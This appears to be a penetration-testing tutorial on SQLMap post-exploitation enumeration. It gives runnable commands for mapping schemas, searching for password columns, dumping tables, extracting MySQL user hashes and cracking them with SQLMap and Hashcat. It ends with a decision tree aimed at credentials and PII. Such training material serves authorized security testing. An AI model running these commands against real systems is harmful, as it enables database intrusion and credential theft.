# Advanced Database Enumeration

Beyond basic table dumping, SQLMap provides targeted search, schema mapping, and built-in hash cracking that accelerates the post-exploitation phase significantly.

***

## Schema Enumeration

`--schema` retrieves the complete database architecture: every database, every table, and every column with its data type, all in one pass:

```bash
sqlmap -u "http://target.com/?id=1" --schema --batch
```

This is the reconnaissance step before targeted dumping. The output reveals column types that indicate what kind of data is stored:

| Column Type | Likely Contains |
|------------|----------------|
| `varchar(512)` | Passwords, tokens, usernames |
| `blob` | Binary data, files, encoded content |
| `text` | Free-form data, notes, keys |
| `datetime` | Audit logs, creation timestamps |
| `char(41)` | MySQL password hashes specifically |

Reviewing schema output before dumping avoids wasting time on tables containing irrelevant data and immediately highlights high-value targets like `accounts`, `credentials`, or `users` tables.

***

## Searching by Keyword

When a database has dozens of tables and hundreds of columns, searching by keyword is far faster than reviewing the full schema:

```bash
# Search for tables containing the word "user"
sqlmap -u "http://target.com/?id=1" --search -T user --batch

# Search for columns containing the word "pass"
sqlmap -u "http://target.com/?id=1" --search -C pass --batch

# Search for a specific database name
sqlmap -u "http://target.com/?id=1" --search -D master --batch
```

The `--search` flag uses MySQL's `LIKE` operator internally, so partial matches work. Searching `-C pass` returns columns named `password`, `passwd`, `passphrase`, or anything containing `pass`. SQLMap also prompts whether to immediately dump any found tables, which `--batch` answers with Y automatically.

***

## Password Hash Cracking

When SQLMap encounters column values that match known hash formats during a dump, it triggers automatic cracking:

```bash
sqlmap -u "http://target.com/?id=1" --dump -D master -T users --batch
```

SQLMap's cracking workflow:
```
1. Detects hash format automatically (SHA1, MD5, bcrypt, MySQL native, etc.)
2. Prompts to save hashes for external tools (useful for harder hashes)
3. Prompts to crack with built-in dictionary
4. Runs multi-process attack using available CPU cores
5. Displays cracked passwords inline alongside the hash in the output table
```

The built-in dictionary contains 1.4 million entries compiled from public password leaks. SQLMap supports 31 hash types. Weak or common passwords crack quickly; anything bcrypt or Argon2 with a high cost factor is better handled by Hashcat with a GPU.

For hashes that do not crack, save them with option 1 in the prompt and pass to Hashcat:

```bash
# After saving to /tmp/hashes.txt
hashcat -m 300 /tmp/hashes.txt rockyou.txt       # MySQL hashes
hashcat -m 100 /tmp/hashes.txt rockyou.txt        # SHA1
hashcat -m 0   /tmp/hashes.txt rockyou.txt        # MD5
```

***

## Database User Credential Extraction

`--passwords` targets the MySQL system tables directly rather than application tables, extracting the database-level user credentials:

```bash
sqlmap -u "http://target.com/?id=1" --passwords --batch
```

This queries `mysql.user` for all database users and their password hashes, then immediately offers to crack them. A cracked `root` MySQL password is significant because:

- It enables direct database connections from any host if `root@%` is configured (no host restriction)
- It may be reused as the OS root password or other service credentials
- It grants access to all databases including those the web application user cannot reach

***

## The Nuclear Option: --all

```bash
sqlmap -u "http://target.com/?id=1" --all --batch
```

Retrieves absolutely everything accessible: all databases, all tables, all columns, schema, users, passwords, privileges, hostname, and banner. This will run for a very long time on any non-trivial database and produces a large output directory. Use it only when:

- Scope explicitly permits exhaustive extraction
- You need a complete evidence dump for a report
- Time is not a constraint

The output is stored in `~/.local/share/sqlmap/output/target/` and should be reviewed with grep rather than reading directly.

***

## Enumeration Decision Tree

```
Start: Injection confirmed
        |
        v
--banner --current-user --current-db --is-dba
        |
        v
Is-DBA = True?
  Yes → --passwords (crack DB user credentials)
  No  → Continue with limited privileges
        |
        v
--schema (map full database structure)
        |
        v
--search -T user / --search -C pass
(find high-value tables/columns fast)
        |
        v
--dump -T target_table -D target_db
(targeted extraction with -C, --where, --start/stop as needed)
        |
        v
Hash columns found?
  Yes → Let SQLMap crack, or save and use Hashcat
  No  → Review data for plaintext credentials, keys, PII
```
